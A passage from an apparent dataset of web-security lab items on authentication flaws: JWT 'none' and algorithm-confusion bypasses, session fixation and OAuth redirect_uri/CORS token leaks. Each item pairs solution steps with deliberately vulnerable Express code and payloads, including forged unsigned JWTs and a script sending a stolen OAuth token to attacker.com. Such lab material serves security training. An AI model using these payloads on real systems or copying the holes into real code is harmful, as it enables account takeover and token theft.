            "Sign token with leaked public key as HMAC secret",
            "Submit forged token to /admin endpoint"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\nconst publicKey = fs.readFileSync('./public.key');\napp.get('/debug', (req, res) => {\n  res.json({ publicKey: publicKey.toString() });\n});\napp.post('/verify', (req, res) => {\n  const token = req.body.token;\n  try {\n    const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] });\n    res.json({ access: decoded.role === 'admin' ? 'granted' : 'denied' });\n  } catch (e) {\n    res.status(403).json({ error: 'Invalid token' });\n  }\n});\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.LteI-Z9G6QkY2wNIMr24Ld5q4f3xZQZ2x3h3k6W3ZkA",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicHJpdmlsZWdlIjoic3VwZXJ1c2VyIiwicm9sZSI6ImFkbWluIn0.4j5E5QhJ3qz7Q5Q7X5Q7X5Q7X5Q7X5Q7X5Q7X5Q7X5Q"
        ]
    },
    {
        "Lab scenario": "OAuth token leakage via misconfigured CORS in SPA",
        "Lab Description": "The OAuth implementation in the Single Page Application has overly permissive CORS headers. The application leaks access tokens to arbitrary origins through XHR requests. To solve: craft a malicious page that steals OAuth tokens via CORS and uses them to access protected resources.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Identify OAuth callback endpoint with Burp Suite",
            "Analyze CORS headers for permissive settings",
            "Create attacker page with XMLHttpRequest to OAuth endpoint",
            "Lure victim to visit malicious page (simulated in lab)",
            "Capture token from server response and use in Postman"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst cors = require('cors');\nconst app = express();\napp.use(cors({\n  origin: '*',\n  methods: ['GET', 'POST'],\n  allowedHeaders: ['Authorization']\n}));\nconst tokens = {};\napp.get('/oauth/callback', (req, res) => {\n  const token = 'tok_' + Math.random().toString(36).substr(2);\n  tokens[token] = { user: req.query.user || 'anonymous' };\n  res.json({ access_token: token });\n});\napp.get('/api/profile', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  if (tokens[token]) {\n    res.json({ email: 'admin@example.com', role: 'admin' });\n  } else {\n    res.status(401).json({ error: 'Invalid token' });\n  }\n});\napp.listen(3000);",
        "payloads": [
            "<script>fetch('http://victim.com/oauth/callback?user=admin').then(r=>r.json()).then(d=>fetch('http://attacker.com/steal?token='+d.access_token))</script>",
            "var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://victim.com/api/profile'); xhr.withCredentials = true; xhr.send();",
            "fetch('http://victim.com/oauth/callback', {method: 'POST', headers: {'Origin': 'http://evil.com'}, body: JSON.stringify({user: 'admin'})})"
        ]
    },
    {
        "Lab scenario": "Session fixation via WebSocket handshake parameter injection",
        "Lab Description": "The WebSocket upgrade process improperly handles session identifiers passed as URL parameters. The application accepts WebSocket session IDs through query strings without validation. To solve: fixate a session ID through crafted WebSocket URL and hijack victim's authenticated connection.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept WebSocket handshake with Burp Suite",
            "Identify session parameter in upgrade request",
            "Generate fixation token and craft WebSocket URL",
            "Trigger victim authentication (simulated in lab)",
            "Reuse fixated session via WebSocket client"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\nconst server = app.listen(3000);\nconst wss = new WebSocket.Server({ server });\nconst sessions = {};\nwss.on('connection', (ws, req) => {\n  const sessionId = new URL(req.url, 'http://dummy.com').searchParams.get('session') || req.headers['sec-websocket-protocol'];\n  if (sessions[sessionId]) {\n    ws.user = sessions[sessionId];\n    ws.send(`Welcome ${ws.user}`);\n  } else {\n    ws.close(1008, 'Invalid session');\n  }\n});\napp.get('/login', (req, res) => {\n  const sessionId = req.query.session || Math.random().toString(36).substr(2);\n  sessions[sessionId] = req.query.user || 'guest';\n  res.json({ sessionId });\n});\napp.get('/ws-url', (req, res) => {\n  res.send(`ws://localhost:3000/?session=${req.query.session}`);\n});",
        "payloads": [
            "ws://victim.com/?session=fixed_session_id",
            "new WebSocket('ws://victim.com/ws', ['session=injected_session']);",
            "Sec-WebSocket-Protocol: session=highjacked_session"
        ]
    },
    {
        "Lab scenario": "JWT tampering vulnerability in Authorization Header",
      
        "Lab Description": "The application uses JWT tokens for API authorization, but the server fails to validate token signatures properly. The token's algorithm is set to 'none', and the backend fails to enforce cryptographic verification. To solve: forge a valid JWT to access the admin resource and retrieve sensitive user data.",
      
        "Difficulty Level": "Hard",
      
        "Solution Steps": [
          "Use Postman to capture a valid JWT from the Authorization header after logging in with normal credentials.",
          "Verify the JWT token structure and decode its payload using jwt.io or Burp Suite Decoder.",
          "Modify the payload to {\"role\":\"admin\"} and change the header algorithm to 'none'.",
          "Craft the JWT manually or using a Python script without a signature and send the forged Authorization: Bearer <token> header in a GET /admin/users request.",
          "Check the server response for access to the admin dashboard and verify Carlos’s user data is present."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecure'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'admin123') { const token = jwt.sign({ username: 'admin', role: 'admin' }, secret); res.json({ token }); } else if (username === 'carlos') { const token = jwt.sign({ username: 'carlos', role: 'user' }, secret); res.json({ token }); } else { res.status(401).send('Unauthorized'); } }); app.get('/admin/users', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.role === 'admin') { res.send('Admin access granted. User: carlos, email: carlos@domain.com'); } else { res.status(403).send('Forbidden'); } } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(3000);",
      
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
          "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
          "JWT with header: {\"alg\":\"none\"}, payload: {\"role\":\"admin\"} and empty signature"
        ]
      },
      {
        "Lab scenario": "Session fixation vulnerability in login flow",
      
        "Lab Description": "The web app reuses pre-login session IDs after authentication, without regenerating them. An attacker can pre-set a known session ID and then trick a victim into logging in using that same ID. To solve: hijack Carlos's session by setting a fixed session ID before login and access his account page post-authentication.",
      
        "Difficulty Level": "Medium",
      
        "Solution Steps": [
          "Using Burp Suite, intercept a GET /login request and set a fixed session cookie (e.g., sessionid=attacker1234).",
          "Send the link with the preset cookie to the victim (Carlos).",
          "After Carlos logs in, reuse the same session ID (attacker1234) in your browser to gain access.",
          "Browse to /my-account with the hijacked session.",
          "Verify Carlos’s account page is loaded with valid data."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'secret123' }]; const sessions = {}; app.get('/login', (req, res) => { if (!req.cookies.sessionid) { res.cookie('sessionid', Math.random().toString(36).substring(2)); } res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sessionid] = username; res.redirect('/my-account'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user === 'carlos') { res.send('Carlos account data'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
      
        "payloads": [
          "Cookie: sessionid=attacker1234",
          "Trick victim to login with crafted sessionid via link",
          "Reuse sessionid=attacker1234 after victim login"
        ]
      },
      {
        "Lab scenario": "OAuth redirect_uri misconfiguration in OAuth callback endpoint",
      
        "Lab Description": "The OAuth implementation lacks strict validation of the redirect_uri parameter, allowing open redirect-based session hijacking. The application trusts any domain containing the correct base string. To solve: craft a malicious authorization URL that captures a valid OAuth token for Carlos’s session.",
      
        "Difficulty Level": "Easy",
      
        "Solution Steps": [
          "Use Burp Suite or Postman to initiate an OAuth login request to /oauth/authorize with a manipulated redirect_uri containing attacker-controlled domain (e.g., https://evil.com?redirect=https://vulnerable.app).",
          "Observe that the app redirects and appends the access_token as a query parameter to the redirect_uri.",
          "Simulate phishing: send this crafted link to the victim and get them to authorize it.",
          "Access the intercepted token and replay it in Authorization: Bearer <token> to access /my-account.",
          "Verify successful access to Carlos’s account."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const url = require('url'); const app = express(); const tokens = { 'carlos': 'token123' }; app.get('/oauth/authorize', (req, res) => { const { redirect_uri, user } = req.query; if (!user || !redirect_uri.includes('vulnerable.app')) { return res.status(400).send('Invalid request'); } const token = tokens[user]; res.redirect(`${redirect_uri}?access_token=${token}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token123') { res.send('Carlos account info'); } else { res.status(401).send('Invalid token'); } }); app.listen(5000);",
      
        "payloads": [
          "https://vulnerable.app/oauth/authorize?user=carlos&redirect_uri=https://evil.com?redirect=https://vulnerable.app",
          "Authorization: Bearer token123",
          "https://evil.com?access_token=token123"
        ]
      },
      {
        "Lab scenario": "JWT authentication bypass via 'none' algorithm in Authorization header",
        "Lab Description": "The backend uses JWTs for session management and relies on the 'alg' field of the JWT to determine verification logic. The server is misconfigured to accept unsigned tokens by trusting the 'none' algorithm. The application grants access to authenticated endpoints based solely on the decoded payload. To solve: craft a tampered token to access Carlos's account by bypassing signature verification.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept the JWT token issued after logging in as your own user.",
          "2. Decode the JWT using jwt.io or jwt_tool and observe the 'alg' header value is 'HS256'.",
          "3. Modify the 'alg' field to 'none' and change the payload's 'sub' or 'username' field to 'carlos'.",
          "4. Remove the signature segment and reconstruct the token as a two-part JWT.",
          "5. Send the modified token in the Authorization header and access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.use((req, res, next) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); req.user = decoded; next(); } catch (err) { return res.status(403).send('Invalid token'); } }); app.get('/my-account', (req, res) => { if (req.user.username === 'carlos') res.send('Welcome to Carlos’s account!'); else res.send('Not authorized'); }); app.listen(4000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
          "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImNhcmxvcyJ9."
        ]
      },
      {
        "Lab scenario": "Session fixation in cookie-based authentication on login route",
        "Lab Description": "This application uses a fixed `sessionID` value that is issued prior to authentication and is not regenerated upon login. The session ID is accepted from the client and trusted server-side, leading to session fixation. To solve: pre-fixate a session ID and trick the server into accepting it as Carlos’s session after login.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use OWASP ZAP to analyze login flow and observe session cookie issued on visiting /login.",
          "2. Save the initial session ID value and confirm it's preserved after login.",
          "3. Use a second browser/session to initiate login as Carlos with the previously fixated session ID.",
          "4. Log in using Carlos’s credentials in the manipulated session to bind it.",
          "5. Return to the first browser with the fixated session ID and access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'secretpass' }; app.get('/login', (req, res) => { const sid = req.cookies.sessionID || Math.random().toString(36).substr(2); res.cookie('sessionID', sid); res.send('<form method=post>Username:<input name=username> Password:<input name=password><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.sessionID] = username; res.send('Logged in'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionID]; if (user === 'carlos') res.send('Access granted to Carlos’s account'); else res.send('Unauthorized'); }); app.listen(4000);",
        "payloads": [
          "sessionID=abc123; login as carlos",
          "sessionID=fixed_session_token; reuse after login",
          "sessionID=carlos_prebind; match after post-login"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration in redirect_uri trust chain",
        "Lab Description": "This application integrates a third-party OAuth provider. However, it fails to validate the redirect_uri parameter correctly, allowing an attacker to supply an arbitrary value. This allows leaking the access token to an attacker-controlled domain. To solve: exploit the misconfigured OAuth flow and extract the access_token for Carlos’s account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Postman to explore the OAuth flow by initiating login through the app's /oauth/login endpoint.",
          "2. Intercept the OAuth redirect using Burp and identify the redirect_uri parameter.",
          "3. Modify the redirect_uri to an attacker-controlled domain like https://evil.com/callback and resend the request.",
          "4. Log in as Carlos on the OAuth provider and observe the token redirect to your controlled endpoint.",
          "5. Capture the access token and replay it against /my-account using Bearer authentication."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/oauth/login', (req, res) => { const redirect = req.query.redirect_uri; const authURL = `https://oauth.example.com/authorize?client_id=app123&redirect_uri=${redirect}&response_type=token`; res.redirect(authURL); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'VALID_TOKEN_FOR_CARLOS') res.send('Carlos account access granted'); else res.status(401).send('Invalid token'); }); app.listen(4000);",
        "payloads": [
          "redirect_uri=https://evil.com/callback",
          "redirect_uri=https://attacker.site/capture?token=",
          "Authorization: Bearer VALID_TOKEN_FOR_CARLOS"
        ]
      },
      {
        "Lab scenario": "JWT tampering via algorithm confusion in Authorization header",
        "Lab Description": "This lab's API uses JWTs for authentication, but fails to enforce algorithm verification properly. The application accepts the 'alg' field in the token header without validating it against a whitelist. An attacker can modify the token's algorithm to 'none' and forge authentication tokens. The application uses these tokens for REST API access to protected resources. To solve: forge a valid admin token using algorithm tampering to access the /admin endpoint.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Postman to capture a valid Authorization: Bearer <JWT> header after login.",
          "2. Decode the JWT using jwt.io or a local script and observe the 'alg' field and payload structure.",
          "3. Modify the JWT header to {\"alg\":\"none\"} and change the payload to {\"username\":\"admin\",\"role\":\"admin\"}.",
          "4. Remove the signature part of the JWT and reassemble the token with only header.payload.",
          "5. Send a GET request to /admin with the modified JWT in the Authorization header.",
          "6. Observe admin panel access to verify successful tampering."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', role: 'admin' }, { username: 'user1', role: 'user' }]; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, 'secret'); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') return res.send('Admin access granted'); } res.status(403).send('Unauthorized'); }); app.listen(4000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
          "{\"alg\":\"none\"}.{\"username\":\"admin\",\"role\":\"admin\"}."
        ]
      },
      {
        "Lab scenario": "OAuth implicit flow hijack via open redirect in redirect_uri",
        "Lab Description": "This lab simulates a web application using OAuth 2.0 for authentication through a third-party provider. The application improperly validates redirect URIs, allowing arbitrary open redirect manipulation. An attacker can poison the redirect_uri parameter to capture a victim's access token. To solve: craft a malicious OAuth URL to leak Carlos's token and use it to access the protected resource.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to intercept the OAuth login request and identify the redirect_uri parameter.",
          "2. Replace the redirect_uri with a URL you control (e.g., https://attacker.com/oauth/callback).",
          "3. Create a crafted URL like: https://auth-server.com/oauth/authorize?response_type=token&client_id=xyz&redirect_uri=https://attacker.com/oauth/callback.",
          "4. Use social engineering or script injection to trick Carlos into visiting the link.",
          "5. When Carlos authenticates, extract the token from the fragment of the redirected URL (in access_token=...).",
          "6. Replay the token in a request to /api/user-info using Postman to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const users = { 'carlos': { access_token: 'abc123xyz', name: 'Carlos' } }; app.get('/oauth/callback', (req, res) => { const token = req.query.token; if (!token) return res.status(400).send('Missing token'); res.send('Token received: ' + token); }); app.get('/api/user-info', (req, res) => { const token = req.headers['authorization']; if (!token) return res.status(401).send('No token'); const accessToken = token.replace('Bearer ', ''); if (accessToken === 'abc123xyz') return res.send('Welcome Carlos!'); res.status(403).send('Invalid token'); }); app.listen(4000);",
        "payloads": [
          "https://auth-server.com/oauth/authorize?response_type=token&client_id=xyz&redirect_uri=https://attacker.com/oauth/callback",
          "Bearer abc123xyz"
        ]
      },
      {
        "Lab scenario": "Session fixation vulnerability in login flow via preset session cookie",
        "Lab Description": "This lab's login process reuses the session ID that was initially assigned before authentication. The application fails to regenerate a session upon successful login, allowing session fixation. An attacker can pre-assign a session ID to a victim and hijack the session after login. To solve: fixate Carlos’s session ID, then reuse it to access his /dashboard page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to intercept a GET /login request and observe the Set-Cookie: session=<value> response.",
          "2. Store this session cookie and craft a phishing page that loads the application with this cookie preset (e.g., document.cookie='session=attacker-session'; location='/login').",
          "3. Trick Carlos into logging in while using the attacker-controlled session ID.",
          "4. Wait until the victim logs in; the server will bind the session to Carlos's account.",
          "5. Replay the same session cookie to access the /dashboard endpoint.",
          "6. Confirm successful hijack by accessing Carlos's dashboard."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; const users = { carlos: 'hunter2' }; app.get('/login', (req, res) => { if (!req.cookies.session) { const sid = Math.random().toString(36).slice(2); sessions[sid] = { username: null }; res.cookie('session', sid); } res.send('<form method=\"POST\">Login</form>'); }); app.post('/login', (req, res) => { const sid = req.cookies.session; const { username, password } = req.body; if (users[username] === password) { sessions[sid].username = username; res.send('Login successful'); } else { res.status(401).send('Invalid login'); } }); app.get('/dashboard', (req, res) => { const sid = req.cookies.session; if (sessions[sid] && sessions[sid].username === 'carlos') res.send('Welcome to Carlos's dashboard'); else res.status(403).send('Access denied'); }); app.listen(4000);",
        "payloads": [
          "document.cookie='session=fixedsession123';location='/login';",
          "Cookie: session=fixedsession123"
        ]
      },
      {
        "Lab scenario": "JWT signature bypass using 'none' algorithm in authentication middleware",
        "Lab Description": "The application uses JWTs for session management but does not validate the signature algorithm securely. The token is decoded without verifying the signature if the 'alg' field is set to 'none'. The application blindly trusts unsigned JWTs. To solve: Forge a valid admin session by tampering with the JWT payload.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Capture a valid JWT after logging in as a normal user using Burp Suite.",
          "2. Decode the JWT using jwt.io or a Python script and observe the 'alg' field in the header.",
          "3. Modify the JWT header by changing the algorithm to 'none'. Edit the payload to {\"role\": \"admin\"}.",
          "4. Remove the signature part (third segment) completely.",
          "5. Replace the original JWT with the tampered token in the Authorization header using Burp Repeater and send a request to /admin/dashboard to verify access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); app.post('/login', (req, res) => { const { username, password } = req.body; if (username && password) { const token = jwt.sign({ user: username, role: 'user' }, 'insecure-secret', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Login failed'); } }); app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token); if (decoded && decoded.role === 'admin') { res.send('Welcome, admin!'); } else { res.status(403).send('Forbidden'); } }); app.listen(4000, () => console.log('JWT None Alg Lab running'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
          "Authorization: Bearer <forged_token>"
        ]
      },
      {
        "Lab scenario": "Session fixation in login flow using pre-authenticated session IDs",
        "Lab Description": "The application does not regenerate session tokens upon successful login, allowing an attacker to pre-assign a session to the victim. The attacker forces the victim to authenticate using a known session ID. To solve: Fix a session ID for Carlos, get him to log in, and reuse that session to access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to send a GET /login request and observe that a Set-Cookie: session=<value> header is received before authentication.",
          "2. Note the session ID and craft a phishing link with this ID (e.g., https://vulnerable-site.com/login?session=fixed1234).",
          "3. Assume Carlos logs in via this link, attaching the fixed session ID to his authenticated session.",
          "4. After Carlos logs in, reuse the same session ID in your browser or via Burp with the session=fixed1234 cookie.",
          "5. Visit /my-account to confirm Carlos's session is hijacked and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const sessions = {}; const users = { carlos: 'supersecure' }; app.get('/login', (req, res) => { const sid = req.query.session || Math.random().toString(36).substring(2); res.cookie('session', sid); res.send('<form method=\"POST\" action=\"/login\">Username: <input name=\"username\"><br>Password: <input name=\"password\"><br><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; if (users[username] === password) { sessions[sid] = username; res.redirect('/my-account'); } else { res.status(403).send('Invalid'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; if (sessions[sid] === 'carlos') { res.send('Carlos account details'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
        "payloads": [
          "https://vulnerable.com/login?session=fixed1234",
          "Cookie: session=fixed1234"
        ]
      },
      {
        "Lab scenario": "OAuth implicit grant token leakage via referrer",
        "Lab Description": "The application uses OAuth2 Implicit Grant flow with the access token exposed in the URL fragment. Due to improper redirect URI configuration, the token leaks through referrer headers when redirected to third-party content. To solve: Capture Carlos's access token from a leaked referrer and use it to access his profile.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use a malicious redirect URI that points to your controlled site, e.g., https://attacker.com#access_token=<token>.",
          "2. Trick Carlos into authenticating with the OAuth provider using this redirect URI.",
          "3. On redirection, observe the access token fragment in your server logs or browser developer tools.",
          "4. Use Postman to send a GET request to https://vulnerable-site.com/api/user-profile with the Authorization: Bearer <leaked_token> header.",
          "5. Confirm that the token grants access to Carlos’s account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const users = { carlos: { profile: 'Carlos user profile', token: 'abc123token' } }; app.get('/oauth/callback', (req, res) => { const token = req.query.token; if (token) { res.redirect(`https://cdn.tracker.com/image.png#access_token=${token}`); } else { res.send('OAuth failed'); } }); app.get('/api/user-profile', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader?.split(' ')[1]; if (token === 'abc123token') { res.send(users.carlos.profile); } else { res.status(403).send('Access Denied'); } }); app.listen(4000, () => console.log('OAuth Token Leak Lab running'));",
        "payloads": [
          "https://auth-server.com/oauth/authorize?response_type=token&client_id=abc&redirect_uri=https://attacker.com",
          "Authorization: Bearer abc123token"
        ]
      },
      {
        "Lab scenario": "JWT tampering Authentication bypass in API endpoint",
        "Lab Description": "The backend API uses JWTs to authenticate users, but fails to properly verify the signing algorithm. The application trusts the 'alg' value in the token header and skips verification if it's set to 'none'. To solve: Access the admin endpoint using a forged token that impersonates the user 'carlos'.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept a valid JWT by logging in as a regular user.",
          "2. Decode the token using jwt.io or a similar tool. Note the 'alg' and payload contents.",
          "3. Change the header 'alg' value to 'none' and set the payload sub/username to 'carlos'.",
          "4. Remove the signature portion of the token and reassemble it as a two-part JWT.",
          "5. Replay the modified token in a request to the /admin endpoint using Postman or Burp Repeater and verify successful access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); const secret = 'supersecretkey'; app.use((req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; if (token) { try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { req.user = decoded.payload; } else { req.user = jwt.verify(token, secret); } next(); } catch (e) { res.status(401).send('Invalid token'); } } else { res.status(401).send('No token'); } }); app.get('/admin', (req, res) => { if (req.user && req.user.username === 'carlos') { res.send('Welcome, admin carlos'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MiLCJyb2xlIjoiYWRtaW4ifQ."
        ]
      },
      {
        "Lab scenario": "Session fixation vulnerability in login flow",
        "Lab Description": "The session management mechanism reuses a client-supplied session ID even after successful authentication. The application does not regenerate session tokens upon login. To solve: Inject a known session ID and get the victim (Carlos) to log in using that ID, then hijack the session and access their account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to issue a GET request to /login with a custom Set-Cookie: session=attacker123.",
          "2. Send a crafted phishing link with this session ID to Carlos via the /contact endpoint or similar feature.",
          "3. After Carlos logs in, revisit the app using the session=attacker123 cookie in your browser or Burp Repeater.",
          "4. Access the /my-account endpoint and observe that it now shows Carlos's account.",
          "5. Confirm the session takeover by modifying Carlos's profile data or capturing internal data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const sessions = {}; const users = { carlos: 'hunter2' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const sid = req.cookies.session || req.query.session || 'guest'; sessions[sid] = username; res.cookie('session', sid); res.send('Login successful'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user === 'carlos') { res.send('Account page of carlos'); } else { res.send('Not authorized'); } }); app.listen(4000);",
        "payloads": [
          "Cookie: session=attacker123",
          "https://example.com/login?session=attacker123"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration in redirect URI",
        "Lab Description": "The OAuth implementation fails to validate the redirect URI strictly, allowing open redirection and leakage of the authorization code. An attacker can inject a malicious URI with their own domain. To solve: Intercept the OAuth code for Carlos and exchange it for an access token to access the /api/userinfo endpoint.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use OWASP ZAP or Burp to inspect the OAuth authorization request flow.",
          "2. Observe that the redirect_uri parameter is vulnerable to open redirection.",
          "3. Register your own endpoint or use an HTTP listener (e.g., webhook.site) to capture requests.",
          "4. Send Carlos a phishing link to initiate the OAuth login with redirect_uri pointing to your domain.",
          "5. When Carlos clicks the link and authenticates, capture the authorization code and exchange it for a token using curl/Postman.",
          "6. Use the token to call /api/userinfo and confirm Carlos's identity."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const url = require('url'); const tokens = {}; const authCodes = {}; app.get('/authorize', (req, res) => { const { response_type, client_id, redirect_uri, state } = req.query; if (client_id === 'trusted-app') { const code = 'authcode123'; authCodes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); } else { res.status(400).send('Invalid client'); } }); app.get('/token', (req, res) => { const { code } = req.query; if (authCodes[code]) { const token = 'token-' + authCodes[code]; tokens[token] = authCodes[code]; res.json({ access_token: token }); } else { res.status(400).send('Invalid code'); } }); app.get('/api/userinfo', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = tokens[token]; if (user === 'carlos') { res.json({ username: 'carlos', role: 'user' }); } else { res.status(403).send('Invalid token'); } }); app.listen(4000);",
        "payloads": [
          "https://auth.example.com/authorize?client_id=trusted-app&redirect_uri=https://webhook.site/your_id&response_type=code&state=xyz",
          "GET /token?code=authcode123",
          "Authorization: Bearer token-carlos"
        ]
      },
      {
        "Lab scenario": "JWT 'none' algorithm authentication bypass in login API",
